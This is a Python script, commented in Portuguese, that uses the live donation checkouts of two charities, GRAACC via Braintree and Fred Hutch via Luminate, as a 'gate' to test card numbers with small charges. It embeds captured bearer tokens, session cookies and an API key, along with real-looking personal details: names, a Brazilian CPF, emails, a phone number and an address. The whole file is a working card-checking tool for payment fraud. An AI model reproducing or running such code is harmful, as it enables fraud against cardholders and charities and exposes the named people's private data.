import requests

# Gate braintree da https://graacc.org.br debitando 10 reais
def graacc(number, month, year, cvv):
    try:
        woocomerceProcess = "8b7bde1024"
        headers = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
            "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjM5MjQxMTEsImp0aSI6IjBhZTUyYWY2LTViNTMtNGQ5My05Y2M4LTNjZGNmNmYxMTZlOSIsInN1YiI6ImZxY3dyZjI2d2poNzdraDciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZxY3dyZjI2d2poNzdraDciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImdyYWFjY0JSTCJ9fQ.cCGWbGTXsEl-WQrFeFKbE7M3RB21JdfwJcLQwSIMUGf1nXiEFFOq_1yaAVgb5gSExp2W4pTGhxMdkLLjau6pZg",
            "braintree-version": "2018-05-10",
            "content-length": "754",
            "content-type": "application/json",
            "origin": "https://assets.braintreegateway.com",
            "priority": "u=1, i",
            "referer": "https://assets.braintreegateway.com/",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"99\", \"Google Chrome\";v=\"127\", \"Chromium\";v=\"127\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
        }
        data = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": "83f886e-17d7-44e5-a4a3-2a0b275498fc"
            },
            "query": """
                mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                    tokenizeCreditCard(input: $input) {
                        token
                        creditCard {
                            bin
                            brandCode
                            last4
                            cardholderName
                            expirationMonth
                            expirationYear
                            binData {
                                prepaid
                                healthcare
                                debit
                                durbinRegulated
                                commercial
                                payroll
                                issuingBank
                                countryOfIssuance
                                productId
                            }
                        }
                    }
                }
            """,
            "variables": {
                "input": {
                    "creditCard": {
                        "number": number,
                        "expirationMonth": month,
                        "expirationYear": year,
                        "cvv": cvv
                    },
                    "options": {
                        "validate": False
                    }
                }
            },
            "operationName": "TokenizeCreditCard"
        }
        response = requests.post("https://payments.braintree-api.com/graphql", headers=headers, json=data)
        response_json = response.json()
        tokencc = response_json['data']['tokenizeCreditCard']['token']
        headers = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-length": "2978",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "woocommerce_items_in_cart=1; woocommerce_cart_hash=54d5942df2334996e5035700263bac6c; wp_woocommerce_session_069161aa082a8eb2325561d9df956d9f=t_e84f6613bd34867109c02463831dbe%7C%7C1724010510%7C%7C1724006910%7C%7C5772a3221395092c0a932be3c2e1d47e; _gid=GA1.3.1946874030.1723837291; _ga_R8SYH1HFS4=GS1.1.1723837291.1.0.1723837715.0.0.0; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-16%2019%3A48%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fgraacc.org.br%2Fquerodoar%2Ffinalizar-doacao%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fgraacc.org.br%2F; sbjs_first_add=fd%3D2024-08-16%2019%3A48%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fgraacc.org.br%2Fquerodoar%2Ffinalizar-doacao%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fgraacc.org.br%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgraacc.org.br%2Fquerodoar%2Ffinalizar-doacao%2F; _gat_gtag_UA_109423810_1=1; _ga=GA1.1.564931096.1723837291; _ga_F7JZ6LKKE2=GS1.1.1723837291.1.1.1723837716.59.0.0; _gcl_au=1.1.1239026549.1723837292.7395843.1723837724.1723837723",
            "origin": "https://graacc.org.br",
            "priority": "u=1, i",
            "referer": "https://graacc.org.br/",
            "sec-ch-ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }
        params = {
            'wc-ajax': 'checkout'
        }
        data = {
            "billing_first_name": "Leandro",
            "billing_last_name": "Schinaina",
            "billing_persontype": "1",
            "billing_cpf": "984.679.880-61",
            "billing_cnpj": "",
            "billing_email": "leandroschinaina@gmail.com",
            "wc_order_attribution_source_type": "typein",
            "wc_order_attribution_referrer": "https://graacc.org.br/",
            "wc_order_attribution_utm_campaign": "(none)",
            "wc_order_attribution_utm_source": "(direct)",
            "wc_order_attribution_utm_medium": "(none)",
            "wc_order_attribution_utm_content": "(none)",
            "wc_order_attribution_utm_id": "(none)",
            "wc_order_attribution_utm_term": "(none)",
            "wc_order_attribution_session_entry": "https://graacc.org.br/querodoar/finalizar-doacao/",
            "wc_order_attribution_session_start_time": "2024-08-16 19:48:36",
            "wc_order_attribution_session_pages": "1",
            "wc_order_attribution_session_count": "1",
            "wc_order_attribution_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "payment_method": "braintree_cc",
            "braintree_cc_nonce_key": tokencc,
            "braintree_cc_device_data": '{"device_session_id":"0f5cbaed1878562292b1e4c4264b02d7","fraud_merchant_id":null,"correlation_id":"10a4af1be91807a2ae24e64604f3819b"}',
            "braintree_cc_3ds_nonce_key": "",
            "braintree_cc_config_data": '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/fqcwrf26wjh77kh7/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/fqcwrf26wjh77kh7"},"merchantId":"fqcwrf26wjh77kh7","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"braintreeApi":{"accessToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjM5MjQxMTUsImp0aSI6ImIxNGRlNGJhLTY4ZWEtNDQyZi1hNzMyLWY3MzI4YjZiYmMyYyIsInN1YiI6ImZxY3dyZjI2d2poNzdraDciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZxY3dyZjI2d2poNzdraDciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.2IQyZn1296l-LJG4BIyc9jNbCQgZcH08NQqylY6wzMtunfPeaC40n_0AB8MGZ2uhvnB9ruPrV-bEeZ9GIcs2sw","url":"https://payments.braintree-api.com"},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["American Express","Elo","MasterCard","Visa","Hiper","Hipercard"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":false}',
            "terms": "on",
            "terms-field": "1",
            "woocommerce-process-checkout-nonce": woocomerceProcess,
            "_wp_http_referer": "/querodoar/?wc-ajax=update_order_review"
        }
        response = requests.post("https://graacc.org.br/querodoar/?wc-ajax=checkout", headers=headers, params=params, data=data)
        return response
    except Exception as e:
        return 'Não foi possivel fazer as requisições: ', e


def fredhutch(number, month, year, cvv):
    try:
        headers = {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "JSESSIONID=597ABD034CAC3AF262964FD7E9654237.app20047a; language=en_US; amazon-pay-connectedAuth=connectedAuth_general; apay-session-set=C1%2FGO6yoltDovQDKHQfYQjY6pIM%2FZ%2B%2FpttJk82by%2FV1tzQr3nDyMfN0cpEm0wLo%3D; utag_main__sn=1; utag_main_ses_id=1723400970620%3Bexp-session; utag_main__pn=1%3Bexp-session; __utma=1.1833972426.1723400971.1723400971.1723400971.1; __utmc=1; __utmz=1.1723400971.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; __utmb=1.1.10.1723400971; _ga=GA1.1.849568143.1723400972; _gcl_au=1.1.2110092283.1723400972; nmstat=4fbcea9c-ff41-5959-0d9f-1c7788740f1a; sa-user-id=s%253A0-71b31eee-4878-5e42-704d-51b983438f6b.3VTDIanPQZ8Zv%252BiheUb8oDK%252FDub9zfEuF4sQ21OS7p4; sa-user-id-v2=s%253AcbMe7kh4XkJwTVG5g0OPa7G5KlI.AgUxySTbz3y8ntOlM%252FyWe6LEGCo6UhEa7nGNopansgc; sa-user-id-v3=s%253AAQAKIJOzY62aplfwicAgOx3I_tKFv-EKixhUNVQ2j17W3dByEHwYBCDBp96xBjABOgS9M-cxQgQLcTwS.kMjQVDA%252FwXAQbbX8TwbIl04X1BrBc3ZyoB7P7YSB0sI; utag_main__ss=0%3Bexp-session; utag_main_v_id=019142b3f04b0011528123144c470506f00b80670086e; utag_main_dc_visit=1; utag_main_dc_region=us-west-2%3Bexp-session; _ga_MDD3C7W8FJ=GS1.1.1723400971.1.1.1723401104.0.0.0; utag_main__se=21%3Bexp-session; utag_main__st=1723403035419%3Bexp-session; _fhid=FHID1.3.fc7bad4a-7181-4225-9637-5c6b6a67e86c.1723401235428; utag_main_dc_event=20%3Bexp-session",
            "Host": "secure.fredhutch.org",
            "Origin": "https://secure.fredhutch.org",
            "Referer": "https://secure.fredhutch.org/site/SPageServer?pagename=adf_agiv&experience=aug25&s_src=aug25&s_subsrc=aegeh25082&utm_campaign=aug25&fh_element=hptoputilnav&creator=da&team=philanthropy",
            "Sec-CH-UA": "\"Not)A;Brand\";v=\"99\", \"Google Chrome\";v=\"127\", \"Chromium\";v=\"127\"",
            "Sec-CH-UA-Mobile": "?0",
            "Sec-CH-UA-Platform": "\"Windows\"",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest"
        }
        data = {
            "luminateExtend": "1.7.1",
            "method": "donate",
            "v": "1.0",
            "payment_confirmation_id": "",
            "donation_level_selected": "5",
            "lo_form_name": "API Donation Forms: Digital Wallet Payment - aegeh25082",
            "lo_source_code": "aug25",
            "lo_subsource_code": "aegeh25082",
            "form_id": "6480",
            "validate": "true",
            "level_id": "8962",
            "other_amount": "5",
            "directed_fund_initial": "Basic science",
            "directed_fund_autocomplete": "",
            "directed_fund_option": "Basic science",
            "tribute.type": "",
            "tribute_option": "none",
            "ecard.send": "false",
            "payment_type": "credit",
            "card_number": number,
            "card_exp_date_month": month,
            "card_exp_date_year": year,
            "card_cvv": cvv,
            "AmazonBillingAgreementId": "",
            "AmazonOrderReferenceId": "",
            "AmazonAccessToken": "",
            "AmazonPaymentSelected": "",
            "billing.name.first": "Renan",
            "billing.name.last": "braga",
            "billing.address.street1": "Casa",
            "billing.address.street2": "",
            "billing.address.city": "EMBU DAS ARTES",
            "billing.address.state": "None",
            "billing.address.zip": "06817180",
            "billing.address.country": "Brazil",
            "donor.phone": "11995156462",
            "donor.email": "renandasapis@gmail.com",
            "uw_medicine_donor_data_sharing": "",
            "double_the_donation_company_id": "",
            "donor.email_opt_in": "true",
            "terms.inits": "",
            "api_key": "convio_open_api_fhcrc_key2009",
            "response_format": "json",
            "source": "aug25",
            "sub_source": "aegeh25082",
            "suppress_response_codes": "true",
            "ts": "1723401235546"
        }
        response = requests.post("https://secure.fredhutch.org/site/CRDonationAPI", headers=headers, data=data)
        return response
    except Exception as e:
        return 'Não foi possivel fazer as requisições: ', e